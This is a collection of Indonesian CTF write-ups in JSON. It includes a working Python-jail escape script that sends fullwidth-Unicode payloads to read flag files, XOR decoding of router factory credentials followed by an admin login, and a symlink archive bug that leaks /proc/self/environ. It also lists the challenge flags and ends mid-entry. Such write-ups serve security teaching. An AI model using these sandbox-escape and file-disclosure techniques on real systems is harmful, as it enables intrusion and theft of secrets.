        "content": "Endpoint tersebut kemudian diakses menggunakan `curl`:\n\n```bash\ncurl http://chal.thjcc.org:50000/s3cr3t/rep0rt/\n```\n\nResponse:\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width\">\n<title>Internal Report</title>\n</head>\n<body>\n<header>\n<span>internal.portal</span>\n<span>INTERNAL REPORT · CONFIDENTIAL</span>\n</header>\n<main>\n<p>// internal use only</p>\n<h1>Quarterly Access Report</h1>\n<div>\n<p>report token</p>\n<code>\n        THJCC{f0ll0w_th3_str34m_2_th3_h1dd3n_r3p0rt}\n</code>\n</div>\n</main>\n</body>\n</html>\n```\n\nFlag berada langsung di dalam elemen:\n\n```html\n<code>\n```"
      },
      {
        "title": "Why the Flag Makes Sense",
        "content": "Flag:\n\n```\nf0ll0w_th3_str34m_2_th3_h1dd3n_r3p0rt\n```\n\ndibaca sebagai:\n\n```\nfollow_the_stream_to_the_hidden_report\n```\n\nIni sesuai dengan metode penyelesaian challenge:\n\n1. Analisis HTTP logs.\n2. Ikuti alur request / stream.\n3. Temukan endpoint tersembunyi.\n4. Akses internal report.\n5. Ambil report token.\n\nEndpoint akhirnya:\n\n```\nhttp://chal.thjcc.org:50000/s3cr3t/rep0rt/\n```\n\ndan report tersebut menghasilkan flag."
      },
      {
        "title": "TL;DR",
        "content": "```bash\ncurl http://chal.thjcc.org:50000/s3cr3t/rep0rt/\n```\n\nOutput mengandung:\n\n```\nTHJCC{f0ll0w_th3_str34m_2_th3_h1dd3n_r3p0rt}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{f0ll0w_th3_str34m_2_th3_h1dd3n_r3p0rt}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-foren-starrysky",
    "title": "Starry Sky",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Starry Sky",
    "problemDescription": "Flag tidak disimpan sebagai nilai byte utuh pada piksel. Payload ada di LSB kanal Blue. Bit yang dipakai tidak berurutan rapat, tetapi dibaca setiap 5 piksel. Setelah 8 bit dikumpulkan, byte hasilnya masih di-XOR dengan satu byte key `0x5a`.\n\nHasil decode:\n\n```\nTHJCC{c0unt1ng_blu3s_by_thr33s}\n```",
    "tools": [],
    "analysis": "Metadata PNG memberi clue:\n\n```\nEven the truth wears a mask here -- a single byte lifts it.\nThe rest is just knowing which grains to read, and how far apart.\n```\n\nMaknanya cocok dengan:\n\n- `single byte lifts it` → byte hasil ekstraksi di-XOR dengan key satu byte.\n- `which grains to read` → kanal/bit tertentu yang dibaca.\n- `how far apart` → bit dibaca dengan stride tertentu.\n\nTidak ada data tambahan setelah chunk `IEND`, jadi payload bukan append file di akhir PNG.\n\nGambar adalah RGB 512×512. Kanal warna diekstrak menjadi array row-major. Tes byte-level langsung menghasilkan kandidat palsu pendek, jadi pendekatan yang benar adalah membaca bit-plane.\n\nPencarian dilakukan pada bit-plane RGB dengan known plaintext prefix:\n\n```\nTHJCC{\n```\n\nUntuk setiap kandidat bit-plane, start, stride, dan bit-order, 8 bit dikumpulkan menjadi satu byte. Key dihitung dari byte pertama:\n\n```\nkey = extracted_byte_0 XOR ord('T')\n```\n\nKandidat valid yang ditemukan:\n\n```\nchannel    = Blue\nbit        = 0 / LSB\nstart      = 0\nbit stride = 5\nbit order  = MSB-first\nxor key    = 0x5a\n```\n\nKandidat ekuivalen pada data RGB interleaved juga muncul sebagai:\n\n```\nstart  = 2\nstride = 15\n```\n\nItu sama saja dengan membaca kanal Blue setiap 5 pikel karena urutan interleaved adalah `R, G, B`.\n\nTidak ada binary yang perlu dijalankan. Validasi dilakukan dengan ekstraksi bit dari gambar.\n\nLangkah decode:\n\n1. Ambil semua piksel dalam urutan row-major.\n2. Ambil LSB kanal Blue dari setiap piksel.\n3. Mulai dari indeks bit `0`.\n4. Untuk setiap byte, ambil 8 bit dengan jarak `5`:\n\n```\nbit_index = current_position + i * 5\n```\n\n5. Pack 8 bit secara MSB-first.\n6. XOR byte dengan `0x5a`.\n7. Ulangi sampai karakter `}`.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "Arsip:\n\n```\nchallenge.png(2).zip\n```\n\nIsi utama:\n\n```\nchallenge.png\n```\n\nTipe file:\n\n```\nPNG image data, 512 x 512, 8-bit/color RGB, non-interlaced\n```"
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Rumus decoding:\n\n```\nenc_byte = pack_msb(blue_lsb[pos + 0*5], ..., blue_lsb[pos + 7*5])\nplain    = enc_byte XOR 0x5a\npos     += 8 * 5\n```\n\nByte plaintext membentuk flag:\n\n```\nTHJCC{c0unt1ng_blu3s_by_thr33s}\n```"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` membuka PNG dengan Pillow, mengambil LSB kanal Blue, membaca bit dengan stride 5, lalu melakukan XOR `0x5a`. Script berhenti ketika menemukan `}` dan memvalidasi prefix `THJCC{`."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\ncd /mnt/data/starry_sky_recheck\npython3 solve.py challenge.png\n```\n\nOutput:\n\n```\nchannel    : Blue\nbit        : LSB / bit 0\nstart bit  : 0\nbit stride : 5\nxor key    : 0x5a\nflag       : THJCC{c0unt1ng_blu3s_by_thr33s}\n\n<FLAG>THJCC{c0unt1ng_blu3s_by_thr33s}</FLAG>\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"\r\nSolver Starry Sky.\r\n\r\nData disimpan pada LSB kanal Blue.\r\nAmbil bit mulai indeks 0, lompat setiap 5 piksel, pack MSB-first,\r\nlalu XOR setiap byte dengan 0x5a.\r\n\"\"\"\r\n\r\nfrom pathlib import Path\r\nimport argparse\r\nfrom PIL import Image\r\n\r\nXOR_KEY = 0x5A\r\nSTART_BIT = 0\r\nBIT_STRIDE = 5\r\nEXPECTED_PREFIX = \"THJCC{\"\r\n\r\n\r\ndef bits_to_byte_msb(bits):\r\n    value = 0\r\n    for bit in bits:\r\n        value = (value << 1) | (bit & 1)\r\n    return value\r\n\r\n\r\ndef extract_flag(image_path: Path) -> str:\r\n    image = Image.open(image_path).convert(\"RGB\")\r\n    pixels = list(image.getdata())\r\n\r\n    # Ambil LSB kanal Blue dari tiap piksel row-major.\r\n    blue_lsb = [(b & 1) for (_r, _g, b) in pixels]\r\n\r\n    chars = []\r\n    pos = START_BIT\r\n\r\n    while pos + 7 * BIT_STRIDE < len(blue_lsb):\r\n        bits = [blue_lsb[pos + i * BIT_STRIDE] for i in range(8)]\r\n        enc = bits_to_byte_msb(bits)\r\n        dec = enc ^ XOR_KEY\r\n\r\n        if dec < 32 or dec > 126:\r\n            raise ValueError(f\"Byte non-printable di posisi {pos}: 0x{dec:02x}\")\r\n\r\n        chars.append(chr(dec))\r\n\r\n        if dec == ord(\"}\"):\r\n            break\r\n\r\n        pos += 8 * BIT_STRIDE\r\n    else:\r\n        raise ValueError(\"Penutup flag tidak ditemukan\")\r\n\r\n    flag = \"\".join(chars)\r\n\r\n    if not flag.startswith(EXPECTED_PREFIX) or not flag.endswith(\"}\"):\r\n        raise ValueError(f\"Hasil tidak cocok format flag: {flag!r}\")\r\n\r\n    return flag\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(description=\"Extract Starry Sky flag\")\r\n    parser.add_argument(\"image\", nargs=\"?\", default=\"challenge.png\", type=Path)\r\n    args = parser.parse_args()\r\n\r\n    flag = extract_flag(args.image)\r\n\r\n    print(\"channel    : Blue\")\r\n    print(\"bit        : LSB / bit 0\")\r\n    print(f\"start bit  : {START_BIT}\")\r\n    print(f\"bit stride : {BIT_STRIDE}\")\r\n    print(f\"xor key    : 0x{XOR_KEY:02x}\")\r\n    print(f\"flag       : {flag}\")\r\n    print(f\"\\n<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{c0unt1ng_blu3s_by_thr33s}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-misc-67jail",
    "title": "Writeup CTF Misc — 67jail",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF Misc — 67jail",
    "problemDescription": "",
    "tools": [],
    "analysis": "Program meminta input dengan panjang tepat `6767` karakter. Beberapa karakter dilarang, seperti quote, underscore, backslash, dan karakter ASCII alphanumeric. Selain itu, karakter yang merupakan identifier dan tidak berubah setelah normalisasi Unicode NFKC juga ditolak.\n\nBuiltins yang tersedia hanya:\n\n```python\nprint\nopen\nchr\n```\n\nArtinya, jika kita bisa memanggil `print`, `open`, dan `chr`, kita bisa membaca file flag.\n\nMasalah utamanya adalah input tidak boleh mengandung huruf ASCII seperti:\n\n```python\nprint\nopen\nchr\n```\n\nNamun Python mendukung identifier Unicode. Beberapa karakter Unicode seperti fullwidth alphabet akan dinormalisasi oleh parser Python menjadi huruf ASCII biasa. Contohnya:\n\n```python\nｐｒｉｎｔ\n```\n\nakan diperlakukan sebagai:\n\n```python\nprint\n```\n\nKarakter fullwidth ini lolos dari pengecekan ASCII karena bukan ASCII alphanumeric. Selain itu, karakter tersebut berubah ketika dinormalisasi NFKC, sehingga tidak terkena filter:\n\n```python\nunicodedata.normalize(\"NFKC\", \"ｐ\") == \"p\"\n```\n\nJadi kita dapat memakai fullwidth Unicode untuk memanggil fungsi bawaan.",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "**Judul:** 67jail\n**Kategori:** Misc / Python Jail\n**Deskripsi:**\n\n```\n67676767\nnc chal.thjcc.org 9000\n```\n\nTarget challenge adalah keluar dari batasan Python jail dan membaca flag."
      },
      {
        "title": "Source Code",
        "content": "Diberikan file `jail.py`:\n\n```python\n#!/usr/bin/env python3\nimport unicodedata\nbanned = {\"print\": print, \"open\": open, \"chr\": chr}\n\ns = input(\">> \")\n\nif len(s) != 6767:\n    exit(\"wrong length :(\")\n\nif any(c in s for c in \"'\\\"_`\\\\#\"):\n    exit(\"that's not good :(\")\n\nif any(c.isascii() and c.isalnum() for c in s):\n    exit(\"no no no!!!\")\n\nif s.count(\";\") > 1:\n    exit(\"too many semicolons!\")\n\nfor c in s:\n    if c.isidentifier() and unicodedata.normalize(\"NFKC\", c) == c:\n        exit(\"bad:(((\")\n\nexec(s, {\"__builtins__\": banned}, {})\n```"
      },
      {
        "title": "Strategi Eksploitasi",
        "content": "Payload yang dibutuhkan secara konsep:\n\n```python\na=()==();print(open(\"/flag\").read())\n```\n\nNamun karena karakter ASCII alphanumeric dan quote dilarang, payload dibuat menggunakan Unicode fullwidth dan `chr()`.\n\nPertama, kita butuh membuat angka tanpa digit ASCII. Caranya:\n\n```python\nａ=()==()\n```\n\nEkspresi `()==()` bernilai `True`. Dalam Python, `True` dapat dipakai sebagai angka `1`.\n\nJadi untuk membuat angka, kita bisa menjumlahkan `ａ` berkali-kali:\n\n```python\nａ+ａ+ａ\n```\n\nItu bernilai `3`.\n\nKemudian string seperti `/flag` dibuat menggunakan `chr()`:\n\n```python\nchr(47) + chr(102) + chr(108) + chr(97) + chr(103)\n```\n\nTetapi `chr` juga harus ditulis sebagai fullwidth:\n\n```python\nｃｈｒ(...)\n```\n\nAkhirnya payload membaca file `/flag`:\n\n```python\nａ=()==();ｐｒｉｎｔ(ｏｐｅｎ(ｃｈｒ(...)+...).ｒｅａｄ())\n```\n\nPayload kemudian dipadding dengan spasi sampai panjangnya tepat `6767`."
      },
      {
        "title": "Solver",
        "content": "Script berikut digunakan untuk membuat payload otomatis dan mencoba beberapa lokasi flag:\n\n```python\n#!/usr/bin/env python3\nimport os, re, socket, unicodedata, sys\n\nHOST, PORT = \"chal.thjcc.org\", 9000\nTOKEN = os.environ.get(\"TOKEN\", \"\")\n\nFW = str.maketrans(\n    \"abcdefghijklmnopqrstuvwxyz\",\n    \"ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ\"\n)\n\ndef fw(s):\n    return s.translate(FW)\n\nA = fw(\"a\")\n\ndef num(n):\n    return \"+\".join([A] * n)\n\ndef ch(n):\n    return fw(\"chr\") + \"(\" + num(n) + \")\"\n\ndef sexpr(s):\n    return \"+\".join(ch(ord(c)) for c in s)\n\ndef make_payload(path):\n    p = f\"{A}=()==();{fw('print')}({fw('open')}({sexpr(path)}).{fw('read')}())\"\n\n    if len(p) > 6767:\n        raise ValueError((path, len(p)))\n\n    p += \" \" * (6767 - len(p))\n\n    assert len(p) == 6767\n    assert not any(c in p for c in \"'\\\"_`\\\\#\")\n    assert not any(c.isascii() and c.isalnum() for c in p)\n    assert p.count(\";\") <= 1\n    assert not any(c.isidentifier() and unicodedata.normalize(\"NFKC\", c) == c for c in p)\n\n    return p\n\ndef recv_until(sock, marker, timeout=6):\n    sock.settimeout(timeout)\n    data = b\"\"\n    while marker not in data:\n        try:\n            part = sock.recv(4096)\n        except socket.timeout:\n            break\n        if not part:\n            break\n        data += part\n    return data\n\ndef attempt(path):\n    payload = make_payload(path)\n\n    s = socket.create_connection((HOST, PORT), timeout=8)\n\n    data = recv_until(s, b\"token:\")\n    s.sendall((TOKEN + \"\\n\").encode())\n\n    data += recv_until(s, b\"your chosen\")\n    s.sendall(b\"3\\n\")\n\n    data += recv_until(s, b\"nonce:\")\n    nums = re.findall(rb\"\\b\\d{4,}\\b\", data)\n\n    if not nums:\n        print(\"[!] nonce not found\")\n        print(data.decode(errors=\"ignore\")[-500:])\n        return False\n\n    s.sendall(nums[-1] + b\"\\n\")\n\n    data = recv_until(s, b\">>\")\n    s.sendall(payload.encode() + b\"\\n\")\n\n    out = b\"\"\n    s.settimeout(5)\n\n    while True:\n        try:\n            part = s.recv(4096)\n            if not part:\n                break\n            out += part\n        except socket.timeout:\n            break\n\n    txt = out.decode(errors=\"ignore\")\n    m = re.search(r\"THJCC\\{[^}]+\\}\", txt)\n\n    if m:\n        print(\"[HIT]\", path)\n        print(m.group(0))\n        return True\n\n    print(\"[MISS]\", path)\n    print(txt[-250:])\n    return False\n\nif not TOKEN:\n    print(\"Set TOKEN dulu: export TOKEN='ctfd_xxx'\")\n    sys.exit(1)\n\ncandidates = [\n    \"flag.txt\",\n    \"flag\",\n    \"/flag.txt\",\n    \"/flag\",\n    \"FLAG\",\n    \"/app/flag.txt\",\n    \"/home/ctf/flag.txt\",\n    \"/home/ctf/flag\",\n]\n\nfor path in candidates:\n    if attempt(path):\n        break\n```"
      },
      {
        "title": "Eksekusi",
        "content": "Command yang digunakan:\n\n```bash\nexport TOKEN='ctfd_...'\npython3 solve67.py\n```\n\nOutput:\n\n```text\n[MISS] flag.txt\nbye~\n\n[MISS] flag\nbye~\n\n[MISS] /flag.txt\nbye~\n\n[HIT] /flag\nTHJCC{676767676767676767676767676767676767676767676767}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{676767676767676767676767676767676767676767676767}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-misc-allnightlong",
    "title": "All night long...",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge All night long...",
    "problemDescription": "`signal.wav` adalah WAV PCM 16-bit stereo 44.1 kHz. Payload tersembunyi bukan LSB/FSK; kedua channel menyimpan koordinat gambar oscilloscope/vector (X/Y).",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Temuan Penting",
        "content": "- Channel kiri memiliki silence panjang `4.500000–4.650000 s`.\n- Channel kanan memiliki silence yang sama tetapi terlambat `1129` sample (`25.601 ms`).\n- Setelah payload kedua channel disejajarkan, panjang payload aktif adalah `178260` sample.\n- Payload tersebut terdiri dari `60` frame yang identik byte-for-byte.\n- Panjang satu frame adalah `2971` sample.\n- Plot `left[t]` sebagai X dan `right[t+1129]` sebagai Y menghasilkan tulisan vector.\n- Rotasi sekitar `-20°` membuat dua baris tulisan horizontal.\n- Garis perpindahan cepat dibuang dengan threshold kecepatan antar-titik agar glyph terbaca bersih."
      },
      {
        "title": "Detail yang Menyebabkan Salah Baca Awal",
        "content": "Karakter ketiga pada isi flag bukan ASCII `a`. Glyph memiliki acute accent `´` di atas huruf, sehingga karakter yang benar adalah `á` (U+00E1).\n\nTulisan yang direkonstruksi:\n\n```\nTHJCC{\n6pákos}\n```\n\nJadi flag:\n\n```\nTHJCC{δράκος}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport wave\r\nfrom pathlib import Path\r\nimport numpy as np\r\nimport matplotlib.pyplot as plt\r\n\r\nBASE = Path(__file__).resolve().parent\r\nWAV = BASE / 'signal.wav'\r\nOUT = BASE / 'recovered_flag_exact.png'\r\nFLAG = 'THJCC{6pákos}'  # á = U+00E1\r\n\r\ndef zero_runs(x, min_len):\r\n    z = (x == 0)\r\n    d = np.diff(np.r_[False, z, False].astype(np.int8))\r\n    starts = np.where(d == 1)[0]\r\n    ends = np.where(d == -1)[0]\r\n    return [(s, e) for s, e in zip(starts, ends) if e - s >= min_len]\r\n\r\ndef divisors(n):\r\n    out=[]\r\n    for i in range(1, int(n**0.5)+1):\r\n        if n % i == 0:\r\n            out += [i]\r\n            if i*i != n:\r\n                out += [n//i]\r\n    return sorted(set(out))\r\n\r\ndef main():\r\n    with wave.open(str(WAV), 'rb') as w:\r\n        assert w.getnchannels() == 2 and w.getsampwidth() == 2\r\n        sr = w.getframerate()\r\n        a = np.frombuffer(w.readframes(w.getnframes()), dtype='<i2').reshape(-1, 2)\r\n\r\n    L, R = a[:,0], a[:,1]\r\n    # The hidden XY payload is bracketed by 150 ms silence in each channel.\r\n    min_zero = int(sr * 0.12)\r\n    zrL = [r for r in zero_runs(L, min_zero) if r[0] > sr]\r\n    zrR = [r for r in zero_runs(R, min_zero) if r[0] > sr]\r\n    if len(zrL) < 2 or len(zrR) < 2:\r\n        raise SystemExit('Could not locate payload boundaries')\r\n\r\n    # First long zero run ends at payload start; next begins at payload end.\r\n    sL, eL = zrL[0][1], zrL[1][0]\r\n    sR, eR = zrR[0][1], zrR[1][0]\r\n    delay = sR - sL\r\n    if (eL - sL) != (eR - sR):\r\n        raise SystemExit('Channel payload lengths differ unexpectedly')\r\n\r\n    x = L[sL:eL]\r\n    y = R[sR:eR]\r\n    n = len(x)\r\n\r\n    # Find the smallest exact repeating frame period common to both channels.\r\n    period = None\r\n    for p in divisors(n):\r\n        if p < 100:\r\n            continue\r\n        if np.array_equal(x, np.tile(x[:p], n//p)) and np.array_equal(y, np.tile(y[:p], n//p)):\r\n            period = p\r\n            break\r\n    if period is None:\r\n        raise SystemExit('Could not find exact frame period')\r\n\r\n    x = x[:period].astype(float)\r\n    y = y[:period].astype(float)\r\n\r\n    # Rotate drawing to make the two text rows horizontal and suppress fast travel lines.\r\n    deg = -20.0\r\n    t = np.deg2rad(deg)\r\n    xr = x*np.cos(t) - y*np.sin(t)\r\n    yr = x*np.sin(t) + y*np.cos(t)\r\n    speed = np.hypot(np.diff(x), np.diff(y))\r\n\r\n    fig = plt.figure(figsize=(15, 7))\r\n    ax = fig.add_subplot(111)\r\n    for i in range(period - 1):\r\n        if speed[i] < 300:\r\n            ax.plot(xr[i:i+2], yr[i:i+2], linewidth=1.3)\r\n    ax.set_aspect('equal', adjustable='box')\r\n    ax.axis('off')\r\n    fig.tight_layout()\r\n    fig.savefig(OUT, dpi=220, bbox_inches='tight')\r\n    plt.close(fig)\r\n\r\n    print(f'sample_rate={sr}')\r\n    print(f'channel_delay={delay} samples ({delay/sr*1000:.3f} ms)')\r\n    print(f'payload_length={n} samples')\r\n    print(f'period={period} samples, repeats={n//period}')\r\n    print(f'image={OUT}')\r\n    print(f'FLAG={FLAG}')\r\n    print('UTF-8 for á:', 'á'.encode('utf-8').hex())\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{δράκος}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-misc-teagood",
    "title": "Writeup CTF Misc — TeaGod666",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF Misc — TeaGod666",
    "problemDescription": "",
    "tools": [],
    "analysis": "File dicek dengan `xxd`:\n\n```bash id=\"sy1gr4\"\nxxd -l 256 pkg.bin\n```\n\nOutput awal:\n\n```text id=\"xt67he\"\n00000000: 5445 4147 4f44 3636 0100 0b00 3600 4100  TEAGOD66....6.A.\n...\n00000030: 076f c151 5b4d 7465 6173 686f 702d 3636  .o.Q[Mteashop-66\n00000040: 3644 3063 4d48 4177 4b48 4138 4d46 4749  6D0cMHAwKHA8MFGI\n...\n```\n\nTerlihat ada magic header:\n\n```text id=\"j7u5c8\"\nTEAGOD66\n```\n\nKemudian ada string menarik:\n\n```text id=\"v52hhz\"\nteashop-666\n```\n\nSetelah string tersebut, terdapat data berbentuk base64.\n\nPengecekan dengan `strings` juga memperlihatkan data yang sama:\n\n```bash id=\"aer5ol\"\nstrings -a pkg.bin | head -80\n```\n\nOutput:\n\n```text id=\"j83ipa\"\nTEAGOD66\nXVmB0\nQ[Mteashop-666D0cMHAwKHA8MFGIRBCYcDFlGGxQaFAEWBAEGDh1IFAwUFQEMGgZNXA9GV0UHEg4BDE1KD1lZWhsLBiwcChFyAAAAVklDHQcbFQ8MFHAVBhUcGhZQXlNEQB0GBFMJDBNCQ1hCWkUzHBwOBEgWV1AAABNTDgYCXkIWVBsKFV1KEg==\n```\n\nAwalnya data base64 dicoba langsung, tetapi hasilnya rusak. Ini menandakan bahwa base64 tersebut bukan plaintext langsung, melainkan ciphertext yang masih perlu didekripsi.\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "**Judul:** TeaGod666\n**Kategori:** Misc / Web / Firmware Analysis\n**Target:**\n\n```text id=\"y8fqai\"\nhttp://chal.thjcc.org:7254/\n```\n\nChallenge ini menampilkan halaman admin router fiktif bernama **TeaGod666**. Dari deskripsi challenge, banyak petunjuk yang mengarah ke router, firmware update, default credential, dan sistem log.\n\n---"
      },
      {
        "title": "Recon Awal",
        "content": "Pertama, halaman utama diakses menggunakan `curl`:\n\n```bash id=\"a0pbzm\"\ncurl http://chal.thjcc.org:7254/\n```\n\nDari source HTML/JavaScript, ditemukan beberapa endpoint API penting, yaitu:\n\n```text id=\"aa4zpr\"\n/api/update/check\n/api/update/package?channel=stable\n/api/login\n/api/session\n/api/router\n/api/system/logs?level=info\n```\n\nEndpoint tersebut terlihat langsung dari JavaScript frontend. Fungsi `checkVersion()` memanggil `/api/update/check`, lalu hasilnya menampilkan `package_url`. Selain itu, form login mengirim request ke `/api/login`, lalu setelah login berhasil frontend mengambil data router melalui `/api/router`.\n\n---"
      },
      {
        "title": "Mengecek Endpoint Update",
        "content": "Endpoint update dicek terlebih dahulu:\n\n```bash id=\"da6hdp\"\ncurl -s \"$U/api/update/check\" | jq\n```\n\nOutput:\n\n```json id=\"s19ko0\"\n{\n  \"current_version\": \"TG666-1.4.2\",\n  \"latest_version\": \"TG666-1.4.2\",\n  \"update_available\": false,\n  \"package_url\": \"/api/update/package?channel=stable\"\n}\n```\n\nMeskipun tidak ada update baru, endpoint tetap memberikan URL package:\n\n```text id=\"z3vk54\"\n/api/update/package?channel=stable\n```\n\nPackage tersebut kemudian diunduh:\n\n```bash id=\"sk02e8\"\ncurl -sSL -D hdr.txt -o pkg.bin \"$U/api/update/package?channel=stable\"\nfile pkg.bin\nwc -c pkg.bin\n```\n\nOutput menunjukkan ukuran file sangat kecil:\n\n```text id=\"xjhq5w\"\npkg.bin: data\n237 pkg.bin\n```\n\nKarena ukurannya kecil, file ini kemungkinan bukan firmware asli, melainkan data challenge yang disamarkan.\n\n---"
      },
      {
        "title": "Eksploitasi Package",
        "content": "Karena ditemukan string `teashop-666` tepat sebelum base64, string tersebut dicoba sebagai key XOR.\n\nScript decode:\n\n```python id=\"w25wm6\"\nimport base64\n\nd = open(\"pkg.bin\", \"rb\").read()\n\nkey = b\"teashop-666\"\n\ni = d.index(key) + len(key)\n\nct = base64.b64decode(d[i:])\n\npt = bytes(c ^ key[j % len(key)] for j, c in enumerate(ct))\n\nprint(pt.decode())\n```\n\nJalankan:\n\n```bash id=\"dawko3\"\npython3 solve_pkg.py\n```\n\nOutput:\n\n```json id=\"p49mpp\"\n{\n  \"model\": \"TeaGod666\",\n  \"username\": \"admin\",\n  \"password\": \"oolong_tea_666\",\n  \"note\": \"Factory service account. Rotate after first boot.\"\n}\n```\n\nDari sini ditemukan credential factory service account:\n\n```text id=\"pnbpeu\"\nusername: admin\npassword: oolong_tea_666\n```\n\n---"
      },
      {
        "title": "Login Sebagai Admin",
        "content": "Login dilakukan menggunakan credential yang ditemukan:\n\n```bash id=\"edrs51\"\ncurl -i -s -c c.txt -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"admin\",\"password\":\"oolong_tea_666\"}' \\\n  \"$U/api/login\"\n```\n\nOutput:\n\n```http id=\"hy1x4n\"\nHTTP/1.0 200 OK\nSet-Cookie: teagod_session=iHPIka4eVxy-92HpSgLLwwbppNx36IxZJGbJSTcxZmg; HttpOnly; SameSite=Lax; Path=/\n\n{\"ok\": true}\n```\n\nLogin berhasil dan server memberikan cookie session `teagod_session`.\n\nSession kemudian dicek:\n\n```bash id=\"f2mr9i\"\ncurl -s -b c.txt \"$U/api/session\" | jq\n```\n\nOutput:\n\n```json id=\"sr4k7o\"\n{\n  \"authenticated\": true\n}\n```\n\n---"
      },
      {
        "title": "Membaca Log Debug",
        "content": "Setelah login berhasil, endpoint log dapat diakses. Pertama dicek log level `info`:\n\n```bash id=\"da02er\"\ncurl -s -b c.txt \"$U/api/system/logs?level=info\" | jq\n```\n\nNamun log info hanya menampilkan event biasa seperti WAN link, DNS, client join, dan admin login.\n\nKemudian dicoba level `debug`:\n\n```bash id=\"jvkoqi\"\ncurl -s -b c.txt \"$U/api/system/logs?level=debug\" | jq\n```\n\nOutput berisi event tambahan:\n\n```json id=\"ain7z6\"\n{\n  \"time\": \"2026-08-15T05:42:27+00:00\",\n  \"level\": \"DEBUG\",\n  \"event\": \"factory_validation\",\n  \"message\": \"maintenance note: THJCC{t3ag0d666_h77p5://y0u7u.b3/Dji_wUhFPvo?si=z1B9a-4nShzop-du&t=1577}\"\n}\n```\n\nFlag ditemukan pada log debug di event `factory_validation`.\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{t3ag0d666_h77p5://y0u7u.b3/Dji_wUhFPvo?si=z1B9a-4nShzop-du&t=1577}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-misc-timemachine",
    "title": "Time Machine",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Time Machine",
    "problemDescription": "Service menyediakan fitur upload archive lewat endpoint `/restore`, lalu membuat arsip ulang lewat endpoint `/snapshot`.\n\nBug utamanya ada di validasi archive. Aplikasi mengecek nama file di dalam archive, tetapi tidak mengecek target symlink. Akibatnya, archive berisi symlink dengan nama aman seperti `leak` bisa diterima. Ketika snapshot dibuat, `shutil.make_archive()` mengikuti symlink tersebut dan memasukkan isi file target ke dalam `snapshot.zip`.\n\nFlag akhirnya didapat dari environment process lewat symlink ke:\n\n```\n/proc/self/environ\n```\n\nFlag:\n\n```\nTHJCC{th3_v3r1f13r_ch3ck3d_th3_n4m3_but_n0t_th3_l1nkn4m3}\n```",
    "tools": [],
    "analysis": "Saat halaman utama diakses, service menampilkan form upload archive. Tipe file yang diterima:\n\n```\n.zip\n.tar\n.tar.gz\n.tgz\n.tar.bz2\n.tar.xz\n```\n\nSetelah upload berhasil, server membalas `302 FOUND` dan memberikan cookie session. Cookie ini wajib dipakai lagi saat mengambil `/snapshot`, karena workspace file disimpan per-session.\n\nTanpa cookie yang sama, snapshot yang diunduh kosong.\n\nContoh masalah awal:\n\n```\nsnapshot.zip: Zip archive data (empty)\nwarning [snapshot.zip]: zipfile is empty\n```\n\nSetelah memakai cookie jar dengan `curl -c` dan `curl -b`, file biasa berhasil masuk ke snapshot.\n\nSource aplikasi berhasil dibaca melalui snapshot symlink ke:\n\n```\n/app/app.py\n/proc/self/cwd/app.py\n```\n\nPotongan penting dari source:\n\n```python\nWORKSPACE = os.environ.get(\"WORKSPACE\", \"/var/timemachine\")\nALLOWED_NAME = re.compile(r\"^[\\w.\\-]{1,64}$\")\n\ndef escapes(name: str) -> bool:\n    if not name:\n        return True\n    if name.startswith(\"/\") or os.path.isabs(name):\n        return True\n    return \"..\" in name.replace(\"\\\\\", \"/\").split(\"/\")\n```\n\nFungsi `escapes()` memvalidasi `name`, bukan target symlink. Karena itu nama `leak` dianggap aman walaupun symlink-nya menunjuk ke file di luar folder restore.\n\nDari output `/view?path=leak`, terlihat route view menolak symlink keluar folder:\n\n```\n403 Forbidden\nThat path is not inside your restore directory.\n```\n\nNamun `/snapshot` masih bisa membocorkan isi target symlink karena proses archive mengikuti link.",
    "solution": [
      {
        "title": "File Challenge",
